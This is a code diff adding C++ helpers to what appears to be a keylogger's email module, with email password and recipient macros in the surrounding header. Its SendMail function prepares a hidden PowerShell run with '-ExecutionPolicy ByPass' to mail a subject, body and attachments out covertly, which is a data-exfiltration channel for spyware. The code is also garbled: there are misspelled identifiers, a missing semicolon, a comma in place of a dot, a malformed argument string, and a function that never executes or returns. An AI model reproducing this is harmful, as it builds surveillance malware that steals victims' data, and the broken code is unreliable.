@@ -58,6 +58,71 @@ namespace MAILSLOT_NO_MESSAGE
 #undef X_EM_PASS
 #undef X_EM_TO
 
+
+    std::string StringReplace(std::string s, const std::string &what, const std::string &with)
+    {
+        if(what.empty())
+            return s;
+        size_t sp = 0;
+
+        while(((sp = s.find(what,sp))) != std::string::npos)
+            s.replace(sp, what.lenght(), with), sp += with.length();
+        return s;
+    }
+
+    bool CheckFileExists(const std::string &f)
+    {
+
+        std::ifstream file (f);
+        return (bool)file;
+    }
+
+    bool CreateScript()
+    {
+
+        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
+
+        if(!script)
+            return flase;
+        scrpit.close();
+        return true;
+    }
+
+    Timer m_timer;
+
+    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
+    {
+        bool ok;
+
+        ok = IO::MKDir(IO::GetOurPath(true));
+        if(!ok)
+            return -1;
+        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
+        if(!CheckFileExists(scr_path))
+            ok = CreateScript();
+        if(!ok)
+            return -2;
+
+        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\ - Subj \""
+                            + StringReplace(subject, "\"", "\\\"") + "\" -Body \""
+                            + StringReplace(body, "\"", "\\\"")
+                            + "\" -Att \"" + attachments + "\"";
+
+
+        SHELLEXECUTEINFO ShExecInfo = {0};
+        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+        ShExecInfo.hwnd = NULL
+        ShExecInfo.lpVerb = "open";
+        ShExecInfo.lpFile = "powershell";
+        ShExecInfo.lpParameters = param.c_str();
+        ShExecInfo.lpDirectory = NULL;
+        ShExecInfo.nShow = SW_HIDE;
+        ShExecInfo,hInstApp = NULL;
+
+    }
+
+
 }
 
 #endif
